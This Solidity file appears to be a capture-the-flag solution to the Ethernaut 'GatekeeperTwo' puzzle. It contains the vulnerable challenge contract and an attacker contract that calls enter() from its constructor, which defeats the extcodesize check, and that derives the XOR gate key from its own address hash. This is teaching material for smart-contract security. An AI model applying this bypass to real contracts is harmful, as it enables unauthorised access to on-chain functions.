// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {x := extcodesize(caller())}
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwo1 {
    GatekeeperTwo gatekeeperTow;
    constructor(GatekeeperTwo _gatekeeperTow) public {
        gatekeeperTow = _gatekeeperTow;
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1 );
        gatekeeperTow.enter(key);
        
    }

    function getTest() public view  returns(uint64){
        return  uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1 ;
    }

      function getTest1() public view  returns(bytes8){
        return  bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1 );
    }
}